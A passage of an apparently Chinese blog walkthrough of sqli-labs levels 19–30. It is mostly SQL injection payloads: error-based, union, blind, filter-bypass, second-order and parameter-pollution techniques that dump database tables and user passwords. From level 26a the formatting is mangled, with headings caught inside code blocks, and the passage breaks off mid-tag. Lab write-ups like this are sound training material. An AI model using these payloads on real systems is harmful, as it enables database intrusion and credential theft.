+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201149812.png" srcset="/img/loading.gif" lazyload alt="image-20250305194359527"></p>
+<p>提示referer</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br> <br><span class="hljs-attribute">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="20（cookie）"><a href="#20（cookie）" class="headerlink" title="20（cookie）"></a>20（cookie）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201151227.png" srcset="/img/loading.gif" lazyload alt="image-20250305194725524"></p>
+<p>出现cookie</p>
+</li>
+<li><p>登录后在刷新抓包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201156027.png" srcset="/img/loading.gif" lazyload alt="image-20250305195520723"></p>
+<p>测试单引号闭合</p>
+<p>使用<strong>联合注入或者报错注入</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database())),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br> <br><span class="hljs-attribute">uname</span>=admin&#x27;<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select  group_concat(table_name)),<span class="hljs-number">0</span>x7e) from information_schema.tables where table_schema=&#x27;security&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">uname</span>=admin&#x27;<span class="hljs-number">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(column_name)),<span class="hljs-number">0</span>x7e) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br><br><span class="hljs-attribute">uname</span>=admin&#x27;<span class="hljs-number">1</span>&#x27;and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select distinct concat(<span class="hljs-number">0</span>x7e, (select group_concat(username,id,password)),<span class="hljs-number">0</span>x7e) from users ),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>) and &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="21（cookie-base64）"><a href="#21（cookie-base64）" class="headerlink" title="21（cookie+base64）"></a>21（cookie+base64）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201158713.png" srcset="/img/loading.gif" lazyload alt="image-20250305200559293"></p>
+<p>出现base64编码</p>
+<p>闭合为单引号（‘）</p>
+</li>
+<li><p>解码后使用</p>
+<p><strong>联合注入或者报错注入</strong></p>
+</li>
+</ul>
+<h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201158713.png" srcset="/img/loading.gif" lazyload alt="image-20250305200559293"></p>
+<p>出现base64编码</p>
+<p>闭合为双引号（“）</p>
+</li>
+<li><p>解码后使用</p>
+<p><strong>联合注入或者报错注入</strong></p>
+</li>
+</ul>
+<h2 id="23（只联合）"><a href="#23（只联合）" class="headerlink" title="23（只联合）"></a>23（只联合）</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201206189.png" srcset="/img/loading.gif" lazyload alt="image-20250305202555964"></p>
+<p>本题过滤了#和–（ 不能注释后面的字符）</p>
+<p><strong>只能使用联合</strong></p>
+<p><strong>因为只有联合使用OR ‘1’&#x3D;’1可以代替注释符</strong></p>
+<p>但是使用报错注入的话，and ‘1’&#x3D;’1<strong>不能</strong>替代注释符</p>
+<ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201208232.png" srcset="/img/loading.gif" lazyload alt="image-20250305202437014"></p>
+<p>为单引号闭合</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27; =&#x27;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>, database(),version() or &#x27;<span class="hljs-number">1</span>&#x27; = &#x27;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(select group_concat(table_name) from information_schema.tables where table_schema=‘security&#x27;),<span class="hljs-number">3</span> or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(select group_concat(column_name) from information_schema.columns where table_schema=‘security&#x27; and table_name=‘users’ ),<span class="hljs-number">3</span> or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span>=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(select group_concat(password,“-”,username) from users),<span class="hljs-number">3</span> or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="24-二次注入"><a href="#24-二次注入" class="headerlink" title="24(二次注入)"></a>24(二次注入)</h2><ul>
+<li><p>注册</p>
+<p>账号admin’ #</p>
+<p>密码111</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201210310.png" srcset="/img/loading.gif" lazyload></p>
+<p>再登录账号</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201211474.png" srcset="/img/loading.gif" lazyload alt="image-20250305205830652"></p>
+<p>修改密码</p>
+<p>111 222 222</p>
+<p>但是此时的admin’ #密码并没有修改（因为账户为admin‘ # <strong>屏蔽了后面的密码修改代码</strong>）</p>
+<p>所以成功绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201212847.png" srcset="/img/loading.gif" lazyload alt="image-20250305210131665"></p>
+<p>可以登入数据库</p>
+</li>
+</ul>
+<h2 id="25（双写）"><a href="#25（双写）" class="headerlink" title="25（双写）"></a>25（双写）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201213782.png" srcset="/img/loading.gif" lazyload alt="image-20250305210241340"></p>
+<p>注释了or和and</p>
+<p>限制了联合和报错的order by   |  and  xxxx</p>
+<p>重复注入（oorr      anandd）只过滤一个</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;<br><br>?<span class="hljs-attribute">id</span>=1&#x27; anandd updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&#x27; anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>),0x7e),1) --+ <br><br>?<span class="hljs-attribute">id</span>=1&#x27;anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),0x7e),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&#x27;anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>),0x7e),1) --+<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; oorrder by 3<br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,3<br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,database(),version()<br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br>?<span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(username ,id , password) <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="25a"><a href="#25a" class="headerlink" title="25a"></a>25a</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201219296.png" srcset="/img/loading.gif" lazyload alt="image-20250306190129999"></p>
+<p>无反馈，为数字注入</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><br><br>?id=<span class="hljs-number">1</span> anandd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?id=<span class="hljs-number">1</span> anandd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span>  group_concat(<span class="hljs-built_in">table_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+ </span><br><br>?id=<span class="hljs-number">1</span>anandd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br>?id=<span class="hljs-number">1</span>anandd updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(username,id,<span class="hljs-keyword">password</span>)),<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">from</span> users ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> oorrder <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),version()<br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="26（双写、注释符绕过）"><a href="#26（双写、注释符绕过）" class="headerlink" title="26（双写、注释符绕过）"></a>26（双写、注释符绕过）</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201221348.png" srcset="/img/loading.gif" lazyload alt="image-20250306190428247"></p>
+<p>过滤了逻辑运算符，<strong>注释符</strong>以及空格</p>
+<p><strong>双写绕过逻 辑运算符或者使&amp;&amp;和||替换</strong></p>
+<p>空格过滤：</p>
+<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span> Tab键（水平）<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> 新建一行<br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span> 新的一页<br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span> return 键<br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span> Tab键（垂直）<br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span></span> 空格<br>() 绕过<br></code></pre></td></tr></table></figure>
+
+<p>注释符绕过：</p>
+<p><strong>;%00</strong></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span>anandd(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);%<span class="hljs-number">00</span><br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;anandd(updatexml(1,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1));%00</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span>anandd(updatexml(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(infoorrmation_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)),<span class="hljs-number">1</span>));%<span class="hljs-number">00</span><br>显示不全（因为显示的字段太长，有限制）<br><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;anandd(updatexml(1,mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;</span>users<span class="hljs-string">&#x27;)),40,100),1));%00</span><br><span class="hljs-string">(加mid由于，其可以使用更加简洁的输出想要的字段)</span><br><span class="hljs-string">?id=1&#x27;</span>anandd(updatexml(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span>(group_concat(username,<span class="hljs-number">0x7e</span>,passwoorrd))<span class="hljs-keyword">from</span>(users)),<span class="hljs-number">1</span>));%<span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201223817.png" srcset="/img/loading.gif" lazyload alt="image-20250306193603285"></p>
+</li>
+</ul>
+<h2 id="26a"><a href="#26a" class="headerlink" title="26a"></a>26a</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201225844.png" srcset="/img/loading.gif" lazyload alt="image-20250306193957125"></p>
+<p>无显示报错信息</p>
+<p>不能使用报错注入，使用盲注&#x2F;联合</p>
+<p>（但是联合括号太多了）</p>
+</li>
+<li><pre><code class="hljs">
+?id=1&#39;)anandd(length(database())=8);%00
+?id=1&#39;)anandd(ascii(substr(database(),1,1))=115);%00
+?id=1&#39;)anandd(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29);%00
+?id=1&#39;)anandd(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101);%00
+
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>  <br><br><span class="hljs-section">## 27</span><br><br><span class="hljs-bullet">-</span> 确定以单引号闭合<br><br>  ![<span class="hljs-string">image-20250306200303124</span>](<span class="hljs-link">https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201228451.png</span>)<br><br>  而且禁用了两个关键词<br><br>  <span class="hljs-strong">**UNION &amp; SELECT**</span><br><br><span class="hljs-bullet">-</span> 有报错可以使用报错注入，可以使用<span class="hljs-strong">**大小写**</span>绕过<br><br></code></pre></td></tr></table></figure>
+?id=1&#39;and(updatexml(1,concat(0x7e,database()),0x7e),1);%00
+
+?id=1&#39;and(updatexml(1,(SELect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1));%00
+
+?id=1&#39;and(updatexml(1,(SELect(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)),1));%00
+显示不全（因为显示的字段太长，有限制）
+
+?id=1&#39;and(updatexml(1,mid((SELect(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)),40,100),1));%00
+(加mid由于，其可以使用更加简洁的输出想要的字段)
+?id=1&#39;and(updatexml(1,(SELect(group_concat(username,0x7e,password))from(users)),1));%00
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## <span class="hljs-number">27</span>a<br><br>- 双引号注入<br><br>但是无报错，所以使用盲注<br><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<p>?id&#x3D;1”and(length(database())&#x3D;8);%00<br>?id&#x3D;1”and(ascii(substr(database(),1,1))&#x3D;115);%00<br>?id&#x3D;1”and(length((SELect(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())))&#x3D;29);%00<br>?id&#x3D;1”and(ascii(substr((SELect(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;database())),1,1))&#x3D;101);%00</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>## <span class="hljs-number">28</span><br><br>![image<span class="hljs-number">-20250306203746685</span>](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/<span class="hljs-number">20251027201231191.</span>png)<br><br>过滤空格和注释符<br><br>- 单引号+括号闭合<br><br>  无回显，使用盲注/联合<br><br>- ```<br>  ?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)and(length(database())=8);%00</span><br><span class="hljs-string">  ?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>);%<span class="hljs-number">00</span><br>  ?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)and(length((SELect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29);%00</span><br><span class="hljs-string">  ?id=1&#x27;</span>)<span class="hljs-keyword">and</span>(ascii(substr((<span class="hljs-keyword">SELect</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(infoorrmation_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema=<span class="hljs-keyword">database</span>())),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span>);%<span class="hljs-number">00</span><br>  <br></code></pre></td></tr></table></figure>
+
+<h2 id="28a"><a href="#28a" class="headerlink" title="28a"></a>28a</h2><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201232792.png" srcset="/img/loading.gif" lazyload alt="image-20250306203625655"></p>
+<p>只过滤union select</p>
+<p>双写绕过</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;);%00  <br><br>?<span class="hljs-attribute">id</span>=1&#x27;) order by 3;%00  <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,2,3;%00  <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,database(),version();%00 <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>;%00  <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>;%00  <br><br>?<span class="hljs-attribute">id</span>=-1&#x27;) ununion selection select 1,2,group_concat(username,id,password) <span class="hljs-keyword">from</span> users;%00  <br></code></pre></td></tr></table></figure>
+
+<p>或者布尔注入</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">同上题<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="29HPP-http参数污染（双服务器）"><a href="#29HPP-http参数污染（双服务器）" class="headerlink" title="29HPP http参数污染（双服务器）"></a>29HPP http参数污染（双服务器）</h2><ul>
+<li><pre><code class="hljs">id=1&#39; order by 3--+（使用双引号测试）（闭合括号）
+?id=-1&#39; union select 1,2,3--+
+?id=-1&#39; union select 1,database(),version()--+
+?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+
+?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+
+?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### 重点<br><br>参数污染:提交相同参数，不同的处理方式<br><br></code></pre></td></tr></table></figure>
+?id=123
+cookie: id=123
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure>
+?id=123&amp;id=13555
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>对两个id的传参处理不一样<br><br>![image<span class="hljs-number">-20250306211048605</span>](https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/<span class="hljs-number">20251027201238412.</span>png)<br><br><br><br>## <span class="hljs-number">30</span><br><br>- ```<br>  id=<span class="hljs-number">1</span>&quot; order by 3--+（使用双引号测试）（闭合括号）<br>  ?id=-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br>  ?id=<span class="hljs-number">-1</span>&quot; union select 1,database(),version()--+<br>  ?id=-1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span 